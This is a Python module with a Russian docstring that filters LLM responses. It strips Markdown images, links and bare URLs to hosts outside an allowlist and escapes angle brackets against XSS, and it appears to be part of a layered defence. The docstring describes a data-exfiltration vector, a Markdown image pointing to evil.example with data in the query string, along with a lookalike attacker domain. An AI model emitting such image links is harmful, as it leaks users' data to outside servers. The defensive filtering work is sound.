# -*- coding: utf-8 -*-
"""Слой 4. Выход: ответ модели — тоже недоверенный текст (глава III, LLM10).

Закрывает:
  - LLM10 Improper Output Handling: если модель вставила в ответ
    Markdown-картинку ![](https://evil.example/c?d=...), клиент сам загрузит
    её и утечёт данными в URL на чужой сервер;
  - XSS через ответ: ответ уходит пользователю как HTML-текст, поэтому
    < и > экранируются.

check_output(text, allowed_hosts) возвращает безопасный вариант ответа:
  - Markdown-картинки ![alt](url) с адресом ВНЕ allowed_hosts заменяются
    на «[изображение удалено]»;
  - Markdown-ссылки [текст](url) вне списка — на свой текст (без адреса);
  - «голые» адреса http(s)://... вне списка — на «[ссылка удалена]»;
  - хост «внутри списка» — сам хост или его поддомен (docs.company.example
    разрешает sub.docs.company.example, но не
    docs.company.example.attacker.com);
  - < и > заменяются на &lt; и &gt;, чтобы ответ нельзя было вставить
    на страницу как HTML.
"""
import re
from urllib.parse import urlparse

_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(([^)\s]+)\)")
_MD_LINK = re.compile(r"\[([^\]]+)\]\(([^)\s]+)\)")
_BARE_URL = re.compile(r"https?://[^\s<>\")\]]+")


def _host_allowed(url: str, allowed_hosts: set) -> bool:
    try:
        host = (urlparse(url).hostname or "").lower()
    except ValueError:
        return False
    return any(host == h or host.endswith("." + h) for h in allowed_hosts)


def check_output(text: str, allowed_hosts: set) -> str:
    hosts = {str(h).lower() for h in allowed_hosts}

    def img_sub(m: re.Match) -> str:
        return m.group(0) if _host_allowed(m.group(2), hosts) else "[изображение удалено]"

    def link_sub(m: re.Match) -> str:
        return m.group(0) if _host_allowed(m.group(2), hosts) else m.group(1)

    def url_sub(m: re.Match) -> str:
        return m.group(0) if _host_allowed(m.group(0), hosts) else "[ссылка удалена]"

    text = _MD_IMAGE.sub(img_sub, text)
    text = _MD_LINK.sub(link_sub, text)
    text = _BARE_URL.sub(url_sub, text)
    return text.replace("<", "&lt;").replace(">", "&gt;")
